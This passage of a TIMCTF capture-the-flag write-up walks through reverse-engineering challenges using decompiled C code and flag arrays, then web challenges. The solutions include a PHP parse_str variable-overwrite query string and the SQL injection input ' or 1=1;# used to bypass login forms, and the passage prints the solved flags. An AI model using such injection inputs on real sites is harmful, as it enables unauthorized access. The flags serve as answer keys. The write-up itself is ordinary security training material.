  __int16 v16; // [rsp+48h] [rbp-18h]
  unsigned __int64 v17; // [rsp+58h] [rbp-8h]

  v17 = __readfsqword(0x28u);
  v11 = 7142820555239287888LL;
  v12 = 8462115404900429676LL;
  v13 = 7451053173976080498LL;
  v14 = 7953753264878285413LL;
  v15 = 2387226065748172907LL;
  v16 = 10;
  if ( ptrace(0, 0LL, 1LL, 0LL) == -1 )
  {
    std::operator<<<std::char_traits<char>>(&_bss_start, &v11);
    result = 255;
  }
  else
  {
    std::operator<<<std::char_traits<char>>(&_bss_start, "Enter password: \n");
    std::operator>><char,std::char_traits<char>,std::allocator<char>>(&std::cin, &input);
    if ( pipe(pipe_1) == -1 )
    {
      std::operator<<<std::char_traits<char>>(&_bss_start, "Failed creating pipe!\n");
      result = 0;
    }
    else if ( pipe(pipe_2) == -1 )
    {
      std::operator<<<std::char_traits<char>>(&_bss_start, "Failed creating pipe!\n");
      result = 0;
    }
    else
    {
      pid = fork();
      if ( pid == -1 )
      {
        std::operator<<<std::char_traits<char>>(&_bss_start, "Fork failed!\n");
        result = 0;
      }
      else if ( pid )
      {
        s1 = (char *)std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::c_str(&input);
        v4 = std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::size(&input) != 48
          || strncmp(s1, "TIMCTF{", 7uLL)
          || s1[47] != 125;
        if ( v4 )
        {
          std::operator<<<std::char_traits<char>>(&_bss_start, "NOOOOOOOOOOO\n");
          result = 0;
        }
        else
        {
          for ( i = 7; i <= 46; ++i )
          {
            write(dword_202324, &s1[i], 1uLL);
            if ( read(pipe_2[0], &v6, 4uLL) <= 0 )
            {
              std::operator<<<std::char_traits<char>>(&_bss_start, "P: Read failed!\n");
              return 0;
            }
            if ( flag[i - 7] != v6 )
            {
              std::operator<<<std::char_traits<char>>(&_bss_start, "NOOOOOOOOOOO\n");
              return 0;
            }
          }
          std::operator<<<std::char_traits<char>>(&_bss_start, "Yay, you got the flag!\n");
          close(pipe_1[0]);
          close(dword_202324);
          close(pipe_2[0]);
          close(fd);
          waitpid(pid, 0LL, 1);
          result = 0;
        }
      }
      else
      {
        for ( j = 0; j <= 39; ++j )
        {
          buf = 0;
          if ( read(pipe_1[0], &buf, 1uLL) <= 0 )
          {
            std::operator<<<std::char_traits<char>>(&_bss_start, "C: Read failed!\n");
            return 0;
          }
          buf += 96;
          rol(&buf, 2);
          buf ^= 0x7Fu;
          buf = ~buf;
          v6 = 237 * buf;
          write(fd, &v6, 4uLL);
        }
        result = 0;
      }
    }
  }
  return result;
}
```

compare the flag characters

```assembly
lea     rax, flag
mov     edx, [rdx+rax]
mov     eax, [rbp+compare]
cmp     edx, eax
```

```python
flag = [0x000035B2, 0x0000B39A, 0x000074A6, 0x0000AD1F, 
0x0000BEB6, 0x0000BEB6, 0x00008817, 0x000074A6, 
0x00008F7F, 0x0000B0D3, 0x0000BBEF, 0x000074A6, 
0x0000B487, 0x00009A9B, 0x00003D1A, 0x00008BCB, 
0x000074A6, 0x00009A9B, 0x00008F7F, 0x000074A6, 
0x0000C357, 0x000096E7, 0x00008BCB, 0x0000BBEF,
0x00008BCB, 0x000074A6, 0x00009A9B, 0x0000BFA3, 
0x000074A6, 0x000035B2, 0x0000B39A, 0x000074A6, 
0x0000B487, 0x0000232E, 0x0000B487, 0x0000145E, 
0x0000CE73, 0x0000145E, 0x00008BCB, 0x000010AA]
```

set 48 characters with TIMCTF{...}

I brought the rax value before comparing it with the flag. and bring each letter.

**FLAG : `TIMCTF{N0_n33d_for_piPe_if_there_is_N0_pIpEwEeD}`**

<br />

## Strange jump (250pts)

> This application likes to jump!

I found `actual_decrypt` function!

```c
unsigned __int64 actual_decrypt(void)
{
  size_t v0; // rax
  size_t v1; // rbx
  unsigned __int8 v3; // [rsp+Ah] [rbp-216h]
  char v4; // [rsp+Bh] [rbp-215h]
  int v5; // [rsp+Ch] [rbp-214h]
  int v6; // [rsp+10h] [rbp-210h]
  signed int i; // [rsp+14h] [rbp-20Ch]
  signed int j; // [rsp+18h] [rbp-208h]
  signed int k; // [rsp+1Ch] [rbp-204h]
  signed int l; // [rsp+20h] [rbp-200h]
  int m; // [rsp+24h] [rbp-1FCh]
  char v12[8]; // [rsp+30h] [rbp-1F0h]
  char v13[8]; // [rsp+50h] [rbp-1D0h]
  char v14[8]; // [rsp+70h] [rbp-1B0h]
  __int64 v15; // [rsp+B0h] [rbp-170h]
  __int64 v16; // [rsp+B8h] [rbp-168h]
  __int64 v17; // [rsp+C0h] [rbp-160h]
  __int64 v18; // [rsp+C8h] [rbp-158h]
  __int64 v19; // [rsp+D0h] [rbp-150h]
  __int64 v20; // [rsp+D8h] [rbp-148h]
  __int64 v21; // [rsp+E0h] [rbp-140h]
  __int64 v22; // [rsp+E8h] [rbp-138h]
  char v23; // [rsp+F0h] [rbp-130h]
  char v24[264]; // [rsp+100h] [rbp-120h]
  unsigned __int64 v25; // [rsp+208h] [rbp-18h]

  v25 = __readfsqword(0x28u);
  memset(v24, 0, 0x100uLL);
  while ( 1 )
  {
    v0 = strlen(byte_203302);
    if ( isprint(byte_203302[v0 - 1]) )
      break;
    byte_203302[strlen(byte_203302) - 1] = 0;
  }
  strcpy(v14, "VElNQ1RGe2RlQzNwdDF2ZV9FeGNlUDB0aTBuX2g0bmRMZXJ9");
  v15 = 'HGFEDCBA';
  v16 = 'PONMLKJI';
  v17 = 'XWVUTSRQ';
  v18 = 'fedcbaZY';
  v19 = 'nmlkjihg';
  v20 = 'vutsrqpo';
  v21 = '3210zyxw';
  v22 = '/+987654';
  v23 = 0;
  strcpy(v12, "NOOOOOOOOOOOOOOOOOO\n");
  strcpy(v13, "Yay, you got the flag!\n");
  v6 = 0;
  v4 = 0;
  for ( i = 0; i < strlen(byte_203302); i += 3 )
  {
    v5 = byte_203302[i + 2] | ((byte_203302[i + 1] | (byte_203302[i] << 8)) << 8);
    for ( j = 0; j <= 2; ++j )
    {
      if ( !byte_203302[i + j] )
        v4 = 1;
    }
    for ( k = 3; k >= 0; --k )
    {
      v3 = 0;
      for ( l = 5; l >= 0; --l )
      {
        if ( v5 & (1 << (6 * k + l)) )
          v3 |= 1 << l;
      }
      if ( v3 )
      {
        v24[v6] = *(&v15 + v3);
      }
      else if ( v4 )
      {
        v24[v6] = 61;
      }
      else
      {
        v24[v6] = 65;
      }
      ++v6;
    }
  }
  v1 = strlen(v14);
  if ( v1 == strlen(v24) )
  {
    for ( m = 0; ; ++m )
    {
      if ( !v14[m] )
      {
        puts(v13);
        exit(0);
      }
      if ( v14[m] != v24[m] )
        break;
    }
    puts(v12);
  }
  else
  {
    puts(v12);
  }
  return __readfsqword(0x28u) ^ v25;
}
```

This function do base64 calculation.

Put the `VElNQ1RGe2RlQzNwdDF2ZV9FeGNlUDB0aTBuX2g0bmRMZXJ9` in v14. 

just base64 decode `VElNQ1RGe2RlQzNwdDF2ZV9FeGNlUDB0aTBuX2g0bmRMZXJ9`.

```python
>>> import base64
>>> base64.b64decode('VElNQ1RGe2RlQzNwdDF2ZV9FeGNlUDB0aTBuX2g0bmRMZXJ9')
'TIMCTF{deC3pt1ve_ExceP0ti0n_h4ndLer}'
```

**FLAG : `TIMCTF{deC3pt1ve_ExceP0ti0n_h4ndLer}`**

<br />

# Web

## Not so empty website (50pts) ![](https://user-images.githubusercontent.com/32904385/65112572-156dcb80-da1b-11e9-8133-e348ea7ecc6b.png)

> This website looks empty, but trust me, it is not!
>
> http://89.38.208.143:20001/

- We can see web site link.  
- Check the html code, and we can see flag.

```html
<!DOCTYPE html>
<html>
<head>
	<title>NO FLAG</title>
</head>
<body>
    <div style="margin-top:100px"><a style="font-family: San Francisco;font-size: 54px;line-height: 41px;color: #000000;">I KNOW YOU WANT A FLAG BUT I DON'T HAVE ANY!</a></div>
    <!--Or I do: TIMCTF{D0_not_b3_superfic1al}-->
</body>
```

**FLAG : `TIMCTF{D0_not_b3_superfic1al}`**

<br />

## Secret key of swag (150pts) ![](https://user-images.githubusercontent.com/32904385/65112572-156dcb80-da1b-11e9-8133-e348ea7ecc6b.png)

> Our spies leaked the authentication algorithm for this site, but the login seems rigged. Is it so?
>
> http://89.38.208.143:20002/
>
> This is a reupload as yesterday an unintended solution was found
>
> index.php 99b9fd6c5262ab6762059d333ced10eb

in index.php

```php
<?php

if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['action'])){
        $action = $res['action'];
    }
}

if ($action === 'login') {
    if (!empty($res['key'])) {
        $key = $res['key'];
    }

    if (!empty($key)) {
        $processed_key = strtoupper($key);
    }
    if (!empty($processed_key) && $processed_key === 'hax0r') {
        echo file_get_contents( "flag.txt" );
    }
    else {
        echo 'Sorry, you don\'t have enough swag to enter';
    }
}

?>
```

- We can use parse_str() function to control $processed_key varriable.

> http://89.38.208.143:20002/?action=login&processed_key=hax0r

```
Please inspect element, your flag is there<?php
//TIMCTF{Welcome_M4N_of_SW4G}, I have been expecting you!
?>
```

**FLAG : `TIMCTF{Welcome_M4N_of_SW4G}`**

<br />

## Admin panel (200pts) ![](https://user-images.githubusercontent.com/32904385/65112572-156dcb80-da1b-11e9-8133-e348ea7ecc6b.png)

> Your job is to hack this admin panel and login.
>
> http://89.38.208.143:20003/

- Input ```asdf@asdf.com``` in Email
- Input ```' or 1=1;#``` in Password

**FLAG : `TIMCTF{SqL_1nj3ct1on_1s_b4ck_1n_town}`**